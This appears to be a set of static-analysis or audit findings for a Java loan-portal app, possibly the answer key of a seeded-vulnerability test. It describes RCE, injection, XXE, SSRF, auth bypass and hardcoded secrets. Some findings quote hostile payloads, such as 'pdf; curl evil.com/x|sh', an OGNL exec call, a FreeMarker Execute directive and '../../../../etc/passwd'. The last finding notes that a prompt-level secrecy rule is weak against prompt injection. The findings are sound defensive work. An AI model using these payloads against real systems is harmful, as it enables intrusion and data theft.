extra.message: The 'expression' field from the request JSON body is passed directly to ognl.Ognl.getValue(expression, vars). OGNL expression evaluation over untrusted input is a well-known RCE vector (arbitrary method invocation, e.g. via @java.lang.Runtime@getRuntime().exec(...) or ProcessBuilder through OGNL's static method access), allowing full server compromise.

reconcileSettlement decodes a Base64 'blob' query parameter and feeds it directly into java.io.ObjectInputStream#readObject() with no type allow-list. Any attacker who can reach this endpoint can submit a crafted serialized gadget-chain payload to achieve remote code execution.

FEED_MAPPER is built with ObjectMapper#enableDefaultTyping(), which enables Jackson polymorphic type handling, and importLeadsJson() calls FEED_MAPPER.readValue(feed, Object.class) on an attacker-supplied JSON string (AdminResource#importFeedJson). This is the classic Jackson 'default typing' gadget-chain RCE vector.

buildPacket() concatenates the {fmt} path parameter directly into a shell command string and runs it via new ProcessBuilder("sh", "-c", cmd). An authenticated staff user can set fmt to e.g. 'pdf; curl evil.com/x|sh' to execute arbitrary OS commands.

searchLeads() builds a native SQL query by directly concatenating the 'businessName' form parameter into the LIKE clause ('...WHERE business_name LIKE '%' + businessName + '%''). An attacker can break out of the string literal to perform SQL injection (data exfiltration, blind boolean/time-based injection).

searchFeed() builds an XPath expression by concatenating the 'businessName' request field directly into the query string ("//lead[business_name='" + businessName + "']/contact_email"). An attacker can inject XPath syntax to alter the query logic and extract arbitrary node values from the parsed document.

searchFeed() creates a DocumentBuilderFactory and parses attacker-supplied XML ('feed') without disabling DOCTYPE declarations or external entities (no FEATURE_SECURE_PROCESSING, no disallow-doctype-decl). This allows XXE attacks (local file disclosure, SSRF) via a crafted <!DOCTYPE> with an external entity.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: importLeadsXml() creates a default javax.xml.stream.XMLInputFactory without disabling IS_SUPPORTING_EXTERNAL_ENTITIES/SUPPORT_DTD before parsing an attacker-uploaded XML lead feed, allowing XXE-based file disclosure or SSRF via a crafted DOCTYPE/external entity.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: resolveStaff() builds an LDAP search filter by concatenating the caller-supplied 'accountName' directly into the filter string. An attacker can inject LDAP filter syntax (e.g. '*)(uid=*))(|(uid=' ) to alter search semantics and enumerate or match unintended directory entries.

The settlement-confirmation webhook uses JWT.decode(assertion) (com.auth0.jwt), which only base64-decodes the token and never verifies its signature. There is no call to JWT.require(algorithm)/verifier.verify(). Any caller can forge an arbitrary assertion with any subject/applicationId/settledAmount claims, so this endpoint is effectively unauthenticated and lets anyone approve any loan application for disbursement (PartnerCredentialService, which does implement a real verifier, is never invoked by this endpoint).

cwe: CWE-347: Improper Verification of Cryptographic Signature
CWE-306: Missing Authentication for Critical Function

extra.message: documentFromLink() takes 'sourceUrl' directly from the borrower-supplied JSON body and has the server perform an HTTP GET on it with no scheme/host allow-list or private-IP block. A borrower (lowest-privilege authenticated role) can make the server issue requests to internal-only services (e.g. http://169.254.169.254/, http://core-banking.internal/) and have the response content stored as a 'document'.

sendPartnerNotice() opens an outbound HTTP connection to the request-supplied 'endpointUrl' with no allow-list of destinations, letting the caller direct the server to make arbitrary requests (including to internal-only hosts) and read back the response status.

addPaymentAccount() loads BorrowerProfile.findById(form.profileId) from a borrower-supplied form field with no check that the profile belongs to the current user (unlike every other borrower-profile access path, which goes through OwnershipService). Any authenticated borrower can supply another borrower's profileId and attach a payment account to that other business's profile.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: This response filter reflects the request's Origin header back as Access-Control-Allow-Origin and also sets Access-Control-Allow-Credentials: true for every request under api/, admin/, and underwriter/, for any Origin value. This lets any malicious website, when visited by a logged-in staff or borrower user, make cross-origin credentialed requests to admin/underwriter JSON APIs and read the authenticated responses (e.g. the /admin/leads/search, /underwriter/queue/assignments endpoints), defeating same-origin protections.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: renderAndQueue() compiles the admin-editable NoticeTemplate.subject/body text as a live FreeMarker template (new Template(code, template.body, cfg)) with the default (unsandboxed) FreeMarker Configuration. Since the template source itself is user-editable content (saved via AdminResource#saveNotice with no restriction on FreeMarker syntax), an admin-reachable account can embed FreeMarker directives such as <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")} to achieve remote code execution.

On every application startup, this bean unconditionally creates (if absent) an ADMIN-role account 'operations@loanportal.local' with the hardcoded plaintext password 'Operations#2024'. This is a permanent, undocumented, environment-independent full-admin backdoor credential baked into the source code.

app.session.secret falls back to the hardcoded literal 'dev-only-session-secret-change-me-please-32bytes' whenever the SESSION_SECRET environment variable is unset. This value is the HMAC-SHA256 signing key for session tokens (SessionTokenService); any deployment that forgets to override it lets anyone forge valid, arbitrary-user session cookies, achieving full authentication bypass.

cwe: CWE-321: Use of Hard-coded Cryptographic Key

extra.message: quarkus.datasource.password falls back to the hardcoded literal 'loanportal_dev_pw' whenever DB_PASSWORD is unset, so a misconfigured deployment silently runs with a well-known, source-visible database password.

REF_KEY and REF_IV are hardcoded constants used for every AES/CBC encrypt-decrypt operation performed by this codec. A hardcoded key compiled into the source lets anyone with code access decrypt or forge offer references, and reusing the same IV for every ciphertext with CBC mode is a cryptographic weakness that leaks information about plaintext equality across messages.

cwe: CWE-321: Use of Hard-coded Cryptographic Key
CWE-329: Generation of Predictable IV with CBC Mode

extra.message: ARCHIVE_KEY and ARCHIVE_IV are hardcoded constants used for every AES/CBC decrypt operation on uploaded statement archives. The key is compiled into the source and the IV is static/reused across every decryption, both of which defeat the confidentiality/integrity guarantees CBC mode is meant to provide.

extra.message: The session cookie issued on login is explicitly created with .setHttpOnly(false), making the session token readable by any client-side JavaScript. Combined with any XSS anywhere on the site, this lets an attacker steal the session token directly via document.cookie instead of needing to rely on executing authenticated requests in-page.

queueNotice() builds an HTML response by concatenating the raw 'queueNotice' cookie value directly into a <div> with no HTML-encoding. The cookie is attacker/user-settable via the sibling POST /underwriter/queue/notice endpoint (setQueueNotice sets it from a form field with no sanitization), so a value like '<script>...</script>' is reflected back and executed as HTML/JS on the queue page.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)

extra.message: The officer counter-phrase credential is stored and verified using unsalted MD5 (DigestUtils.md5Hex) rather than a slow, salted password hash (the codebase elsewhere uses BCrypt for user passwords and PBKDF2 for partner credentials). MD5 is cryptographically broken and fast to brute-force offline if the verifier value is ever exposed (e.g. via a DB leak), unlike the deliberately-noted non-scoring MD5 uses elsewhere in this codebase which are only for non-sensitive cache-busting/ETags.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: attributes() resolves the caller-supplied 'reference' string directly against baseDir() with no normalize()/startsWith() containment check, unlike resolveForRead() in the same class which does perform that check. It is reachable from UnderwriterResource#documentAttributes with a staff-supplied 'reference' form field, so a value like '../../../../etc/passwd' lets a caller probe the existence, size, and mtime of arbitrary files on disk.

saveExport() builds the destination file with 'new File(dir.toFile(), fileName)' using the caller-supplied 'fileName' query parameter (AdminResource#saveApplicationsExport) with no sanitization of path-traversal sequences, allowing the generated CSV to be written outside the intended reports directory (e.g. fileName='../../../../tmp/evil.csv').

resolvedEnvironment() puts the live datasource password (datasourceCredential) and the session HMAC signing key (sessionSigningKey) into a Map that is rendered directly on the /admin/import page. These secrets are unnecessarily exposed in the HTML response/template to any session with the ADMIN role, and to anything (logs, browser cache, screen-share) that later captures that page.

This both commits a live credential to source and transmits it in plaintext to an external provider on every request; the instruction 'must never be disclosed' is a prompt-level mitigation only and is not reliable against prompt injection from the untrusted document text concatenated into the same conversation.
